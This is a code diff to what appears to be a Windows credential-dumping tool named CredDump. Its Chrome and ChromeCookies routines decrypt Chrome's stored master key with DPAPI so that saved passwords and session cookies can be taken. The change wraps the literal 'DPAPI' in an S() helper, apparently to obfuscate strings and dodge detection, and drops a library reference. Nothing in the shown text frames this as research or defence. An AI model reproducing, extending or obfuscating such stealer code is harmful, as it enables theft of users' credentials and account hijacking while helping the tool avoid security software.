@@ -3,7 +3,6 @@
 #include <wincrypt.h>
 #include <bcrypt.h>
 #pragma comment(lib, "Crypt32.lib")
-#pragma comment(lib, "Credui.lib")
 #pragma comment(lib, "Bcrypt.lib")
 
 // ── Windows Credential Manager ────────────────────────────────────────────────
@@ -137,7 +136,7 @@ std::string CredDump::Chrome() {
         std::string b64 = js.at("os_crypt").at("encrypted_key").get<std::string>();
         std::vector<BYTE> raw = Base64Decode(b64);
         // First 5 bytes are the ASCII string "DPAPI" — strip them.
-        if (raw.size() > 5 && memcmp(raw.data(), "DPAPI", 5) == 0) {
+        if (raw.size() > 5 && memcmp(raw.data(), S("DPAPI").c_str(), 5) == 0) {
             masterKey = DpapiDecrypt(raw.data() + 5, (DWORD)(raw.size() - 5));
         }
     } catch (...) {
@@ -266,7 +265,7 @@ std::string CredDump::ChromeCookies() {
         auto js = nlohmann::json::parse(lsContent);
         std::string b64 = js.at("os_crypt").at("encrypted_key").get<std::string>();
         std::vector<BYTE> raw = Base64Decode(b64);
-        if (raw.size() > 5 && memcmp(raw.data(), "DPAPI", 5) == 0)
+        if (raw.size() > 5 && memcmp(raw.data(), S("DPAPI").c_str(), 5) == 0)
             masterKey = DpapiDecrypt(raw.data() + 5, (DWORD)(raw.size() - 5));
     } catch (...) {
         return "ChromeCookies: could not parse Local State";
